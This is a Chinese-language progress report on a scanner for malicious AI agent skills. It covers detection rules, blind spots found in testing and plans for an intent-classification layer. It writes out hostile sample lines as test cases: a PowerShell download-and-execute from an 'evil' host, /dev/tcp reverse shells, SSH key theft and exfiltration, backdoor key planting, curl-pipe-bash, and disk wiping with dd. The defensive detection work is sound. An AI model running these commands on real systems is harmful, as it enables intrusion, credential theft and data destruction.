## 3. 本轮真实收获（能力层面，不是分数层面）

### 3.1 修掉一个结构性漏洞：`.ps1` 从未被扫描（FACT）

实测：一个只含 `iwr http://evil/a.ps1 -OutFile a.ps1; powershell -File a.ps1` 的技能，

```
files_scanned=1  findings=0  score=82  grade=A
```

原因：扫描器只 `rglob("*.py")` / `*.sh` / `*.js|*.ts` / `*.md`（`skillgate.py:1316-1358`）。
**Windows 载体完全在盲区**——这在一个"AI Agent Skill 安全"产品里是硬伤，因为企业里最容易落地的恶意技能就是 `.ps1`。

补齐后同一技能：`findings=1 rules=SH017 score=74`。

### 3.2 修掉引号载荷不可见（FACT，上一轮发现）

`clean_line()` 用 `_STRING_RE.sub(" ", line)` 抹掉引号内容，导致 `bash -c '…/dev/tcp/…'` 隐身。
改为对 shell 规则用**原始行**匹配，测试集 3 召回 0.167→1.000，调参集无退化。

### 3.3 引入跨语句污点（本轮新增）

T01/T06 这类"读在第 1 句、发在第 2 句"的形态，按行匹配永远看不到：

- `TAINT01`（Python）：`var = open('…/.ssh/id_rsa')` → 后续 `requests.post(... var ...)`
- `TAINT02`（JS）：文件内 `readFileSync('.ssh')` 与 `axios.post` 同现

### 3.4 引入链式语义（本轮新增）

- `SH014` 凭据 + 网络 sink 同行（覆盖 `python3 -c` 一行式外传）
- `SH015` 下载 → `chmod +x` → 执行（投放链）
- `SH016` 打包 → `nc/socat` 外传
- `SH021` 凭据复制到 `/tmp|/dev/shm`（暂存）
- `SH022` socat 通道、`SH023` 特权容器挂载宿主根、`SH024` 清历史
- `SH017–SH020` PowerShell：下载、IEX、编码命令、关杀毒

规则总数 5 → 24，全部带 `rule_id`。

## 4. 第 5 档为什么一动不动（根因分析）

| 漏报 | 形态 | 为什么新规则也没用 |
|---|---|---|
| V02 | `git clone http://evil/r && make install` | 供应链投毒：**每个命令都合法**，只有"来源+动作组合"可疑 |
| V03 | `echo 'ssh-rsa …' >> ~/.ssh/authorized_keys` | 后门种植：写 `authorized_keys` 是合法的运维动作 |
| V04 | `subprocess.run(['bash','-c','curl … \| bash'])` | 语义在**参数列表内的字符串**里；Python 规则不看参数内容 |
| V06 | `dd if=/dev/zero of=/dev/sda` | 破坏性但"不涉及凭据、不涉及网络"，不在任何既有类别 |

**共同点：这四类都不是"危险字符串"，而是"危险意图"**。
正则能匹配字符串，不能判断意图。这不是规则写得好不好的问题，是表达能力的边界。

## 5. 因此：下一步不是加规则，是换判别模型

按性价比排序：

| 序 | 方案 | 能解决 | 成本 |
|---|---|---|---|
| 1 | **AST 参数级污点**（Python/JS 完整 AST，不是按行） | V04、T06、跨文件 | 中 |
| 2 | **意图分类层**（LLM 读技能全文判"这个技能想干什么"） | V02、V03、V06 | 低-中，但要控成本 |
| 3 | **沙箱动态引爆**（在容器里真跑，看实际行为） | 一切静态看不到的 | 高（需基础设施） |
| 4 | **来源信誉**（域名/仓库/IP 白名单 + 首次出现检测） | V02 | 低 |

我的判断：**第 2 项是断崖式领先真正的入口**。
竞品（阿里云 Skills 安全检测）大概率也在做"规则 + 模型"混合；纯规则 0.33 的召回没法拿出去讲。
把 24 条带 rule_id 的规则作为 **LLM 的取证清单**（告诉模型该看什么），而不是唯一的判据——这个组合的性价比最高，且我们能立刻做。
